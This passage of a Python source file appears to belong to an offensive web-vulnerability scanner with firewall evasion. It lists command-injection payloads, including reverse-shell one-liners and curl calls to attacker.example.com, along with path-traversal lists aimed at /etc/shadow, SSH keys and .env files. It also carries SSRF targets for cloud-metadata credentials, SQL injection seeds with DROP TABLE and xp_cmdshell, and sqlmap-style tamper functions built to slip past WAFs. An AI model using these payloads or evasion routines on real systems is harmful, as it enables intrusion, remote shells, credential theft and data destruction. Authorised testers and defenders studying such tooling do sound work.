        "$(curl http://127.0.0.1:1337/$(id))",
        "; wget -q http://127.0.0.1:1337/$(id)",
        "; nslookup attacker.example.com",
        "; curl http://attacker.example.com/`id`",
        # ── Reverse shell stubs ───────────────────────────────────────────────
        "; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
        "; sh -i >& /dev/tcp/127.0.0.1/4444 0>&1",
        "; python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
        # ── Awesome-WAF: Cloudflare RCE bypass ────────────────────────────────
        "cat$u+/etc$u/passwd$u",
        "cat$u /etc$u/passwd$u",
        ";cat$u+/etc$u/passwd$u",
        # ── Awesome-WAF: ModSecurity bypass (uninitialized vars) ──────────────
        ";+$u+cat+/etc$u/passwd$u",
        ";+$u+cat+/etc$u/passwd+\\#",
        "$u**/bin**$u**/cat**$u $u**/etc**$u**/passwd**$u",
        # ── Awesome-WAF: ModSecurity wildcard / glob ───────────────────────────
        "/???/??t+/???/??ss??",
        "/?in/cat+/et?/passw?",
        "/???/c?t /etc/p?sswd",
        "/bin/c?t /etc/pa?swd",
        # ── Single-quote splitting (bash string) ──────────────────────────────
        "/bi'n'''/c''at' /e'tc'/pa''ss'wd",
        "c'at' /etc/passwd",
        "ca''t /etc/passwd",
        # ── Dollar-string in path ──────────────────────────────────────────────
        "/bin/cat /etc/passwd$u",
        "id$u",
        "whoami$u",
        # ── Null separator ─────────────────────────────────────────────────────
        "id%00",
        "; id%00",
        "| id%00",
    ],

    "LFI": [
        # ── Standard unix traversal at increasing depth ───────────────────────
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../../etc/passwd",
        "../../../../../../../../etc/passwd",
        "../../../../../../../../../etc/passwd",
        "../../../../../../../../../../etc/passwd",
        # ── Null byte (old PHP <5.3.4) ────────────────────────────────────────
        "../../../etc/passwd%00",
        "../../../../etc/passwd%00",
        "../../../etc/passwd%00.jpg",
        "../../../etc/passwd%00.php",
        "../../../etc/passwd\x00",
        # ── URL-encoded slash (LFI-Chef: /→%2f) ──────────────────────────────
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        # ── Double URL encoding (LFI-Chef: /→%252f) ───────────────────────────
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "..%252F..%252F..%252F..%252Fetc%252Fpasswd",
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        # ── 16-bit Unicode encoding (LFI-Chef: /→%u002f, /→%u2215) ───────────
        "..%u002f..%u002f..%u002fetc%u002fpasswd",
        "..%u2215..%u2215..%u2215etc%u2215passwd",
        "..%u002f..%u002f..%u002f..%u002fetc%u002fpasswd",
        # ── Overlong UTF-8 (LFI-Chef: /→%c0%af, /→%e0%80%af, /→%c0%2f) ──────
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "..%e0%80%af..%e0%80%af..%e0%80%afetc%e0%80%afpasswd",
        "..%c0%2f..%c0%2f..%c0%2fetc%c0%2fpasswd",
        "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
        # ── Dot encoding (LFI-Chef: .→%2e) ───────────────────────────────────
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        # ── Mixed traversal variations ────────────────────────────────────────
        "....//....//....//etc/passwd",
        "....////....////....////etc/passwd",
        "..///////..////..//////etc/passwd",
        ".././.././.././etc/passwd",
        "..;/..;/..;/etc/passwd",
        "..%2f..%2f..%2f..%2fetc/passwd",
        "/%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
        # ── Backslash mixed (Windows-style on Linux servers) ──────────────────
        "..\\..\\..\\etc\\passwd",
        "..%5C..%5C..%5Cetc%5Cpasswd",
        # ── Absolute paths: core unix ─────────────────────────────────────────
        "/etc/passwd",
        "/etc/shadow",
        "/etc/group",
        "/etc/hosts",
        "/etc/hostname",
        "/etc/issue",
        "/etc/issue.net",
        "/etc/os-release",
        "/etc/debian_version",
        "/etc/redhat-release",
        "/etc/centos-release",
        "/etc/lsb-release",
        "/etc/fstab",
        "/etc/mtab",
        "/etc/crontab",
        "/etc/cron.d/",
        "/etc/cron.daily/",
        "/etc/environment",
        "/etc/profile",
        "/etc/bashrc",
        "/etc/timezone",
        "/etc/localtime",
        "/etc/resolv.conf",
        "/etc/nsswitch.conf",
        "/etc/motd",
        # ── SSH keys ──────────────────────────────────────────────────────────
        "/root/.ssh/id_rsa",
        "/root/.ssh/id_rsa.pub",
        "/root/.ssh/authorized_keys",
        "/root/.ssh/known_hosts",
        "/home/user/.ssh/id_rsa",
        "/.ssh/id_rsa",
        # ── /proc virtual filesystem ──────────────────────────────────────────
        "/proc/version",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/status",
        "/proc/self/maps",
        "/proc/self/fd/0",
        "/proc/self/fd/1",
        "/proc/self/fd/2",
        "/proc/net/fib_trie",
        "/proc/net/tcp",
        "/proc/sched_debug",
        "/proc/1/cmdline",
        "/proc/1/environ",
        # ── Web server logs (log poisoning candidates) ────────────────────────
        "/var/log/apache/access.log",
        "/var/log/apache/error.log",
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        "/var/log/httpd/access_log",
        "/var/log/httpd/error_log",
        "/usr/local/apache/log/access_log",
        "/usr/local/apache2/log/access_log",
        # ── Auth / syslog for log poisoning ───────────────────────────────────
        "/var/log/auth.log",
        "/var/log/syslog",
        "/var/log/messages",
        "/var/log/secure",
        "/var/log/mail.log",
        "/var/log/vsftpd.log",
        "/var/log/proftpd/proftpd.log",
        "/var/log/pure-ftpd/pure-ftpd.log",
        # ── App config / secrets ──────────────────────────────────────────────
        "/var/www/html/index.php",
        "/var/www/html/config.php",
        "/var/www/html/wp-config.php",
        "/var/www/html/.env",
        "/var/www/.env",
        "/.env",
        "/app/.env",
        "/config/database.yml",
        "/config/secrets.yml",
        "/config/application.yml",
        "/../../../.env",
        # ── Session files ─────────────────────────────────────────────────────
        "/var/lib/php/sessions/sess_",
        "/tmp/sess_",
        "/tmp/session_",
        # ── PHP wrappers: filter base64 ───────────────────────────────────────
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=config.php",
        "php://filter/convert.base64-encode/resource=../config.php",
        "php://filter/convert.base64-encode/resource=../../config.php",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        # ── PHP wrappers: iconv chain ─────────────────────────────────────────
        "php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php",
        "php://filter/convert.iconv.UTF-8.UNICODE/resource=index.php",
        "php://filter/string.rot13/resource=index.php",
        "php://filter/zlib.inflate/convert.base64-encode/resource=index.php",
        # ── PHP wrappers: other ───────────────────────────────────────────────
        "php://input",
        "php://stdin",
        "php://memory",
        # ── Data wrapper (RCE if allow_url_include=On) ────────────────────────
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
        "data://text/plain,<?php system($_GET['cmd']); ?>",
        # ── Expect / phar wrappers ────────────────────────────────────────────
        "expect://id",
        "expect://whoami",
        "phar://./uploads/shell.jpg",
        "zip://./uploads/shell.zip%23shell.php",
        # ── RFI (if allow_url_include=On) ─────────────────────────────────────
        "http://attacker.example.com/shell.txt",
        "http://attacker.example.com/shell.txt%00",
        "\\\\attacker.example.com\\share\\shell.php",
        # ── Windows absolute paths ────────────────────────────────────────────
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:/Windows/System32/drivers/etc/hosts",
        "C:\\Windows\\win.ini",
        "C:/Windows/win.ini",
        "C:\\boot.ini",
        "C:/boot.ini",
        "C:\\inetpub\\wwwroot\\web.config",
        "C:/inetpub/wwwroot/web.config",
        "C:\\Windows\\System32\\config\\SAM",
        "C:\\Windows\\repair\\SAM",
        "C:\\Windows\\System32\\config\\SYSTEM",
        "C:\\Windows\\System32\\config\\SECURITY",
        "C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config",
        # ── Windows traversal ─────────────────────────────────────────────────
        "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
        "..\\..\\..\\Windows\\win.ini",
        "..%5C..%5C..%5CWindows%5Cwin.ini",
        "..%5C..%5C..%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts",
        "..%255C..%255C..%255CWindows%255Cwin.ini",
        # ── Windows 16-bit unicode slash ──────────────────────────────────────
        "..%u005c..%u005c..%u005cWindows%u005cwin.ini",
        "..%u2216..%u2216..%u2216Windows%u2216win.ini",
        "../../windows/win.ini",
    ],

    "SSRF": [
        # ── Standard localhost ─────────────────────────────────────────────────
        "http://127.0.0.1/",
        "http://localhost/",
        "http://127.0.0.1:80/",
        "http://127.0.0.1:8080/",
        "http://127.0.0.1:8443/",
        "http://127.0.0.1:443/",
        # ── IP variants (WAF IP blacklist bypass) ─────────────────────────────
        "http://0.0.0.0/",
        "http://0/",
        "http://127.1/",
        "http://127.0.1/",
        "http://127.00.1/",
        "http://0177.0.0.1/",         # Octal
        "http://0x7f000001/",          # Hex
        "http://2130706433/",          # Decimal
        "http://2130706433:80/",
        # ── IPv6 ──────────────────────────────────────────────────────────────
        "http://[::1]/",
        "http://[::]/",
        "http://[0:0:0:0:0:0:0:1]/",
        "http://[0:0:0:0:0:ffff:127.0.0.1]/",
        "http://[::ffff:127.0.0.1]/",
        "http://[::ffff:7f00:1]/",
        # ── AWS Instance Metadata ──────────────────────────────────────────────
        "http://169.254.169.254/",
        "http://169.254.169.254/latest/",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/meta-data/local-ipv4",
        # ── Google Cloud Metadata ─────────────────────────────────────────────
        "http://metadata.google.internal/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        # ── Alibaba Cloud Metadata ────────────────────────────────────────────
        "http://100.100.100.200/latest/meta-data/",
        # ── Azure IMDS ────────────────────────────────────────────────────────
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        # ── Internal network ──────────────────────────────────────────────────
        "http://192.168.1.1/",
        "http://10.0.0.1/",
        "http://172.16.0.1/",
        "http://192.168.0.1/",
        # ── File protocol ─────────────────────────────────────────────────────
        "file:///etc/passwd",
        "file:///etc/hosts",
        "file:///C:/Windows/System32/drivers/etc/hosts",
        # ── Alternative protocols ─────────────────────────────────────────────
        "dict://127.0.0.1:6379/",
        "dict://127.0.0.1:6379/info",
        "gopher://127.0.0.1:6379/_PING",
        "ftp://127.0.0.1/",
        "sftp://127.0.0.1/",
        "ldap://127.0.0.1/",
        # ── HTTPS variants ────────────────────────────────────────────────────
        "https://127.0.0.1/",
        "https://localhost/",
        # ── Unicode IP bypass ─────────────────────────────────────────────────
        "http://①②⑧.⓪.⓪.①/",
    ],
}

# ═══════════════════════════════════════════════════════════════════════════════
#   SQL INJECTION PAYLOAD SEEDS  (used by Phase 4 tamper sweep)
#   One row per injection category.  Each entry: (label, [payloads...])
#   Payloads include realistic value prefixes ("test'", "1 ", "-1 "…) so
#   tamper functions operate on proper SQL fragments, not bare syntax.
# ═══════════════════════════════════════════════════════════════════════════════

SQLI_PAYLOAD_SEEDS = [
    ("bool-string", [
        "test' AND 1=1--",
        "test' AND 1=2--",
        "admin' OR '1'='1",
        "a' OR 'x'='x",
        "(test)' OR 1=1--",
        "test' AND 'a'='a",
        "x' OR 1=1 OR 'x'='y",
        "foo' OR 1=1 LIMIT 1--",
        "test') OR ('1'='1",
    ]),
    ("bool-numeric", [
        "1 AND 1=1--",
        "1 AND 1=2--",
        "0 OR 1=1--",
        "2-1 AND 1=1--",
        "1 AND TRUE--",
        "1) AND (1=1",
        "1)) OR ((1=1",
        "-1 OR 1=1--",
        "1 OR 2>1--",
    ]),
    ("error-mysql", [
        "test' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
        "test' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
        "test' AND EXP(~(SELECT * FROM (SELECT version())x))--",
        "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "test' AND GTID_SUBSET(CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
    ]),
    ("error-mssql", [
        "test' AND 1=CONVERT(INT,@@version)--",
        "test' AND 1=CONVERT(INT,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "1' AND 1 IN (SELECT @@version)--",
    ]),
    ("error-pgsql", [
        "test' AND 1=CAST((SELECT version()) AS NUMERIC)--",
        "test' AND 1=CAST((SELECT current_user) AS NUMERIC)--",
    ]),
    ("error-oracle", [
        "test' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT banner FROM v$version WHERE ROWNUM=1)||CHR(62))) FROM DUAL)--",
    ]),
    ("time-mysql", [
        "test' AND SLEEP(5)--",
        "test' OR SLEEP(5)--",
        "1 AND IF(1=1,SLEEP(5),0)--",
        "1 AND IF(ASCII(SUBSTRING(database(),1,1))>90,SLEEP(5),0)--",
        "test' AND BENCHMARK(5000000,MD5('test'))--",
        "test' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
        "test' AND ELT(1=1,SLEEP(5))--",
    ]),
    ("time-mssql", [
        "1; WAITFOR DELAY '0:0:5'--",
        "test'; WAITFOR DELAY '0:0:5'--",
    ]),
    ("time-pgsql", [
        "test' AND (SELECT 1 FROM PG_SLEEP(5))=1--",
        "1; SELECT pg_sleep(5)--",
    ]),
    ("time-oracle", [
        "test' AND DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)=1--",
    ]),
    ("time-sqlite", [
        "1 AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--",
    ]),
    ("union-1col", [
        "test' UNION SELECT NULL--",
        "-1' UNION SELECT 1--",
        "-1 UNION SELECT NULL--",
    ]),
    ("union-2col", [
        "test' UNION SELECT NULL,NULL--",
        "-1' UNION SELECT 1,2--",
        "test' UNION SELECT @@version,NULL--",
        "test' UNION SELECT user(),database()--",
    ]),
    ("union-3col", [
        "test' UNION SELECT NULL,NULL,NULL--",
        "-1' UNION SELECT 1,2,3--",
        "test' UNION SELECT 1,CONCAT(0x7e,@@version,0x7e),3--",
        "-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
    ]),
    ("union-all", [
        "test' UNION ALL SELECT NULL,NULL--",
        "-1' UNION ALL SELECT 1,2,3--",
        "0' UNION SELECT username,password,3 FROM users--",
    ]),
    ("stacked", [
        "test'; SELECT 1--",
        "test'; INSERT INTO users VALUES(1,'hacked','hacked')--",
        "1; EXEC xp_cmdshell('whoami')--",
        "test'; DROP TABLE users--",
    ]),
    ("oob", [
        "test' AND LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.oob.example.com\\\\a'))--",
    ]),
    ("generic-waf-bypass", [
        "' un/**/ion sel/**/ect 1,2,3--",
        "' /*!UNION*/ /*!SELECT*/ 1,2,3--",
        "1/*comment*/AND/**/1=1/**/--",
        "1/*!12345UNION*//*!12345SELECT*/1--",
        "(1)AND(1)=(1)--",
    ]),
]

# ═══════════════════════════════════════════════════════════════════════════════
#   WAF DETECTION SIGNATURES
# ═══════════════════════════════════════════════════════════════════════════════

WAF_STATUS_CODES = {400, 403, 406, 419, 429, 503}

WAF_BODY_PATTERNS = [
    r"forbidden",
    r"blocked",
    r"access denied",
    r"request rejected",
    r"detected as attack",
    r"request has been blocked",
    r"your ip.*(?:has been|is) blocked",
    r"security violation",
    r"malicious",
    r"illegal request",
    r"\bwaf\b",
    r"web application firewall",
    r"cloudflare",
    r"sucuri",
    r"incapsula",
    r"f5\s+big-ip",
    r"barracuda",
    r"modsecurity",
    r"mod_security",
    r"intrusion detected",
    r"attack detected",
    r"akamai",
    r"sorry.{0,30}blocked",
    r"error 1010",
    r"error 1006",
    r"error 1015",
    r"attention required",
    r"security check",
    r"ddos protection",
    r"please wait.*verifying",
]

# ═══════════════════════════════════════════════════════════════════════════════
#   SUCCESS / VULNERABILITY INDICATORS
# ═══════════════════════════════════════════════════════════════════════════════

SUCCESS_PATTERNS = {
    "XSS": [
        r"<script>alert\(1\)</script>",
        r"<script>confirm\(1\)</script>",
        r"onerror=alert\(",
        r"onload=alert\(",
        r"javascript:alert",
        r"<svg[^>]+onload=",
        r"<img[^>]+onerror=",
    ],
    "SQL Injection": [
        r"you have an error in your sql syntax",
        r"mysql_fetch",
        r"warning:\s*mysql",
        r"unclosed quotation mark",
        r"quoted string not properly terminated",
        r"syntax error.*sql",
        r"microsoft ole db",
        r"odbc.*error",
        r"ora-\d{5}",
        r"pg::syntaxerror",
        r"sqlite[._]exception",
        r"sql\s+error",
        r"supplied argument is not a valid mysql",
        r"db2 sql error",
        r"invalid query",
    ],
    "Command Injection": [
        r"uid=\d+\(",
        r"root:.*:0:0",
        r"daemon:.+:\d+:\d+",
        r"bin:.+:\d+:\d+",
        r"\[sudo\]",
        r"sh:.*not found",
        r"command not found",
        r"Volume in drive [A-Z]",
        r"Directory of",
        r"Windows IP Configuration",
        r"Linux\s+\S+\s+\d+\.\d+",
    ],
    "LFI": [
        r"root:x:0:0",
        r"root:.*:0:0:",
        r"/bin/bash",
        r"/bin/sh",
        r"daemon:x:",
        r"\[boot loader\]",
        r"\[operating systems\]",
        r"for 16-bit app",
        r"\[extensions\]",
        r"PROCESSOR_IDENTIFIER",
    ],
    "SSRF": [
        r'"ami-id"',
        r'"instance-id"',
        r'"local-ipv4"',
        r"computeMetadata",
        r"iam/security-credentials",
        r"latest/meta-data",
        r"169\.254\.169\.254",
        r"metadata\.google\.internal",
        r"x-aws-ec2",
    ],
}

# ═══════════════════════════════════════════════════════════════════════════════
#   IBM037 (EBCDIC) ENCODING TABLE
#   Source: article technique — charset=ibm037 bypasses UTF-8-only WAF analysis
#   Keep '=' and '&' un-encoded (URL structural chars, per article note)
# ═══════════════════════════════════════════════════════════════════════════════

_IBM037 = {
    ' ':0x40,'!':0x5A,'"':0x7F,'#':0x7B,'$':0x5B,'%':0x6C,"'":0x7D,
    '(':0x4D,')':0x5D,'*':0x5C,'+':0x4E,',':0x6B,'-':0x60,'.':0x4B,
    '/':0x61,'0':0xF0,'1':0xF1,'2':0xF2,'3':0xF3,'4':0xF4,'5':0xF5,
    '6':0xF6,'7':0xF7,'8':0xF8,'9':0xF9,':':0x7A,';':0x5E,'<':0x4C,
    '>':0x6E,'?':0x6F,'@':0x7C,'A':0xC1,'B':0xC2,'C':0xC3,'D':0xC4,
    'E':0xC5,'F':0xC6,'G':0xC7,'H':0xC8,'I':0xC9,'J':0xD1,'K':0xD2,
    'L':0xD3,'M':0xD4,'N':0xD5,'O':0xD6,'P':0xD7,'Q':0xD8,'R':0xD9,
    'S':0xE2,'T':0xE3,'U':0xE4,'V':0xE5,'W':0xE6,'X':0xE7,'Y':0xE8,
    'Z':0xE9,'[':0xAD,'\\':0xE0,']':0xBD,'^':0x5F,'_':0x6D,'`':0x79,
    'a':0x81,'b':0x82,'c':0x83,'d':0x84,'e':0x85,'f':0x86,'g':0x87,
    'h':0x88,'i':0x89,'j':0x91,'k':0x92,'l':0x93,'m':0x94,'n':0x95,
    'o':0x96,'p':0x97,'q':0x98,'r':0x99,'s':0xA2,'t':0xA3,'u':0xA4,
    'v':0xA5,'w':0xA6,'x':0xA7,'y':0xA8,'z':0xA9,
}

def ibm037_encode(text):
    """Percent-encode text in IBM037 (EBCDIC).  '=' and '&' are kept raw."""
    out = []
    for ch in text:
        if ch in ('=', '&'):
            out.append(ch)
        elif ch in _IBM037:
            out.append('%%%02X' % _IBM037[ch])
        else:
            try:
                out.append('%%%02X' % ord(ch))
            except Exception:
                out.append(ch)
    return ''.join(out)


# ═══════════════════════════════════════════════════════════════════════════════
#   SQLMap-STYLE TAMPER FUNCTIONS
#   Each takes a raw SQL string and returns a WAF-evading variant.
#   Ported logic from sqlmapproject/sqlmap/tamper/*.py
# ═══════════════════════════════════════════════════════════════════════════════

import random as _random

_SQL_KEYWORDS = set([
    'SELECT','FROM','WHERE','AND','OR','UNION','ALL','ORDER','BY','GROUP',
    'HAVING','LIMIT','OFFSET','INSERT','INTO','VALUES','UPDATE','SET',
    'DELETE','DROP','CREATE','TABLE','DATABASE','SCHEMA','INDEX','VIEW',
    'IF','ELSE','CASE','WHEN','THEN','END','NOT','IN','LIKE','BETWEEN',
    'IS','NULL','TRUE','FALSE','AS','ON','JOIN','INNER','LEFT','RIGHT',
    'OUTER','CROSS','NATURAL','USING','EXISTS','DISTINCT','TOP','ROWNUM',
    'SLEEP','BENCHMARK','WAITFOR','DELAY','PG_SLEEP','DBMS_PIPE',
    'EXTRACTVALUE','UPDATEXML','EXP','CHAR','ASCII','HEX','UNHEX',
    'CONCAT','CONCAT_WS','GROUP_CONCAT','SUBSTR','SUBSTRING','MID',
    'LENGTH','UPPER','LOWER','TRIM','REPLACE','REVERSE','REPEAT',
    'LOAD_FILE','OUTFILE','DUMPFILE','INFORMATION_SCHEMA','COLUMNS',
    'TABLES','SCHEMATA','USER','VERSION','DATABASE','CURRENT_USER',
    'SESSION_USER','SYSTEM_USER','FLOOR','RAND','CONVERT','CAST',
    'COALESCE','IFNULL','ISNULL','GREATEST','LEAST','ELT','FIELD',
    'MAKE_SET','EXPORT_SET','GET_LOCK','RELEASE_LOCK','GTID_SUBSET',
    'JSON_KEYS','XMLTYPE','UTL_HTTP','DBMS_XPLAN',
    'EXEC','EXECUTE','SP_EXECUTESQL','XP_CMDSHELL','SP_PASSWORD',
    'OPENROWSET','OPENDATASOURCE','BULK','PIVOT','UNPIVOT',
    'BEGIN','DECLARE','PRINT','RAISERROR','ROLLBACK','COMMIT',
    'TRANSACTION','TRIGGER','PROCEDURE','FUNCTION','RETURN',
])


def _is_in_quotes(s, pos):
    """Return True if position pos inside s is within a quoted string."""
    in_single, in_double = False, False
    i = 0
    while i < pos:
        c = s[i]
        if c == "'" and not in_double:
            in_single = not in_single
        elif c == '"' and not in_single:
            in_double = not in_double
        elif c == '\\' and i + 1 < len(s):
            i += 1      # skip escaped char
        i += 1
    return in_single or in_double


def tamper_space2comment(sql):
    """Spaces → /**/   (skip spaces inside quotes)"""
    out, i = [], 0
    while i < len(sql):
        c = sql[i]
        if c == ' ' and not _is_in_quotes(sql, i):
            out.append('/**/')
        else:
            out.append(c)
        i += 1
    return ''.join(out)


def tamper_space2plus(sql):
    """Spaces → +"""
    return sql.replace(' ', '+')


def tamper_space2dash(sql):
    """Spaces → --\\nN  (MySQL inline comment trick)"""
    return sql.replace(' ', '--\nN')


def tamper_space2hash(sql):
    """Spaces → #\\n  (MySQL only — hash comment + newline)"""
    return sql.replace(' ', '#\n')


def tamper_space2mssqlblank(sql):
    """Spaces → random MSSQL-accepted blank (%01 … %20)"""
    blanks = ['%01','%02','%03','%04','%05','%06','%07',
              '%08','%09','%0B','%0C','%0D','%0E','%0F',
              '%10','%11','%12','%13','%14','%15','%16',
              '%17','%18','%19','%1A','%1B','%1C','%1D',
              '%1E','%1F','%20']
    return ''.join(
        _random.choice(blanks) if c == ' ' else c for c in sql)


def tamper_space2mysqlblank(sql):
    """Spaces → random MySQL-accepted blank (%09 %0A %0B %0C %0D)"""
    blanks = ['%09', '%0A', '%0B', '%0C', '%0D']
    return ''.join(
        _random.choice(blanks) if c == ' ' else c for c in sql)


def tamper_space2randomblank(sql):
    """Spaces → one of several blank variants chosen randomly"""
    blanks = ['%09','%0A','%0C','%0D','%20','%A0','/**/','+']
    return ''.join(
        _random.choice(blanks) if c == ' ' else c for c in sql)


def tamper_space2morecomment(sql):
    """Spaces → /**_**/  (extended comment, confuses some WAF regex)"""
    return sql.replace(' ', '/**_**/')


def tamper_randomcase(sql):
    """Randomly capitalise SQL keywords."""
    def _rc(word):
        result = ''
        for c in word:
            result += c.upper() if _random.randint(0,1) else c.lower()
        # Guarantee mixed case
        if result == result.upper() or result == result.lower():
            mid = len(result) // 2
            result = result[:mid] + result[mid].swapcase() + result[mid+1:]
        return result

    def _replace(m):
        w = m.group(0)
        if w.upper() in _SQL_KEYWORDS:
            return _rc(w)
        return w

    return re.sub(r'\b[A-Za-z_]{2,}\b', _replace, sql)


def tamper_uppercase(sql):
    """All SQL keywords → UPPERCASE."""
    def _replace(m):
        w = m.group(0)
        return w.upper() if w.upper() in _SQL_KEYWORDS else w
    return re.sub(r'\b[A-Za-z_]{2,}\b', _replace, sql)


def tamper_lowercase(sql):
    """All SQL keywords → lowercase."""
    def _replace(m):
        w = m.group(0)
        return w.lower() if w.upper() in _SQL_KEYWORDS else w
    return re.sub(r'\b[A-Za-z_]{2,}\b', _replace, sql)


def tamper_charencode(sql):
    """URL-encode every char (skip already-encoded %XX triplets)."""
    out, i = [], 0
    while i < len(sql):
        if sql[i] == '%' and i+2 < len(sql) and all(
                c in '0123456789abcdefABCDEF' for c in sql[i+1:i+3]):
            out.append(sql[i:i+3])
            i += 3
        else:
            out.append('%%%02X' % ord(sql[i]))
            i += 1
    return ''.join(out)


def tamper_chardoubleencode(sql):
    """Double-URL-encode every char."""
    out, i = [], 0
    while i < len(sql):
        if sql[i] == '%' and i+2 < len(sql) and all(
                c in '0123456789abcdefABCDEF' for c in sql[i+1:i+3]):
            # encode the % sign itself
            out.append('%25' + sql[i+1:i+3])
            i += 3
        else:
            pct = '%%%02X' % ord(sql[i])
            out.append('%25' + pct[1:])
            i += 1
    return ''.join(out)


def tamper_charunicodeencode(sql):
    """Unicode-encode alphanumeric chars as %uXXXX."""
    out = []
    for c in sql:
        if c.isalnum():
            out.append('%%u%04X' % ord(c))
        else:
            out.append(c)
    return ''.join(out)


def tamper_charunicodeescape(sql):
    """Unicode escape \\uXXXX for alphanumerics."""
    out = []
    for c in sql:
        if c.isalnum():
            out.append('\\u%04X' % ord(c))
        else:
            out.append(c)
    return ''.join(out)


def tamper_percentage(sql):
    """Add % before each non-space character (ASP/IIS bypass)."""
    out, i = [], 0
    while i < len(sql):
        if sql[i] == '%' and i+2 < len(sql) and all(
                c in '0123456789abcdefABCDEF' for c in sql[i+1:i+3]):
            out.append(sql[i:i+3])
            i += 3
        elif sql[i] == ' ':
            out.append(' ')
            i += 1
        else:
            out.append('%' + sql[i])
            i += 1
    return ''.join(out)


def tamper_overlongutf8(sql):
    """Replace non-alphanumeric chars with overlong UTF-8 %C0%XX / %80%XX."""
    out, i = [], 0
    while i < len(sql):
        c = sql[i]
        if sql[i] == '%' and i+2 < len(sql) and all(
                x in '0123456789abcdefABCDEF' for x in sql[i+1:i+3]):
            out.append(sql[i:i+3])
            i += 3
        elif c.isalnum():
            out.append(c)
            i += 1
        else:
            b = ord(c)
            byte1 = 0xC0 + (b >> 6)
            byte2 = 0x80 + (b & 0x3F)
            out.append('%%%02X%%%02X' % (byte1, byte2))
            i += 1
    return ''.join(out)


def tamper_htmlencode(sql):
    """HTML-entity-encode all non-alphanumeric chars."""
    out = []
    for c in sql:
        if c.isalnum() or c == ' ':
            out.append(c)
        else:
            out.append('&#%d;' % ord(c))
    return ''.join(out)


def tamper_decentities(sql):
    """Decimal HTML entity encode EVERY character."""
    return ''.join('&#%d;' % ord(c) for c in sql)


def tamper_hexentities(sql):
    """Hex HTML entity encode every character."""
    return ''.join('&#x%X;' % ord(c) for c in sql)


def tamper_between(sql):
    """Replace = with BETWEEN and > with NOT BETWEEN (sqlmap between.py)."""
    # = B  →  BETWEEN B AND B
    sql = re.sub(r'=\s*(\w+)', r'BETWEEN \1 AND \1', sql)
    # > B  →  NOT BETWEEN 0 AND B
    sql = re.sub(r'>\s*(\w+)', r'NOT BETWEEN 0 AND \1', sql)
    return sql


def tamper_equaltolike(sql):
    """Replace = with LIKE."""
    return re.sub(r'(?<![<>!])=', ' LIKE ', sql)


def tamper_equaltorlike(sql):
    """Replace = with RLIKE (MySQL)."""
    return re.sub(r'(?<![<>!])=', ' RLIKE ', sql)


def tamper_greatest(sql):
    """Replace > with GREATEST()  per sqlmap greatest.py."""
    def _repl(m):
        lhs = m.group(1).strip()
        rhs = m.group(2).strip()
        return m.group(0).split(lhs)[0] + lhs + ' GREATEST(' + lhs + ',' + rhs + '+1)=' + lhs
    return re.sub(r'([\w().]+)\s*>\s*([\w().]+)', _repl, sql)


def tamper_least(sql):
    """Replace < with LEAST()."""
    def _repl(m):
        lhs = m.group(1).strip()
        rhs = m.group(2).strip()
        return lhs + ' LEAST(' + lhs + ',' + rhs + '+1)=' + lhs
    return re.sub(r'([\w().]+)\s*<\s*([\w().]+)', _repl, sql)


def tamper_modsecurityversioned(sql):
    """Wrap second half of payload in /*!3XREMAINDER*/ (sqlmap modsecurityversioned.py)."""
    # Find first space and wrap remainder
    idx = sql.find(' ')
    if idx < 0:
        return '/*!30000%s*/' % sql
    digit = str(_random.randint(0, 9))
    postfix = ''
